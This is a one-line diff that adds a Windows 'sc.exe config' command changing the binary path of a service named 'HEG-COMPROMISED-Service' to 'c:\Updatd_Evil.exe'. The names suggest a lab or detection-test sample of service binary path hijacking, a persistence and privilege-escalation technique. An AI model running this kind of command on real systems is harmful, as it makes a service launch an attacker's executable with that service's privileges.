@@ -1,0 +1,1 @@
+sc.exe config HEG-COMPROMISED-Service binpath= c:\Updatd_Evil.exe
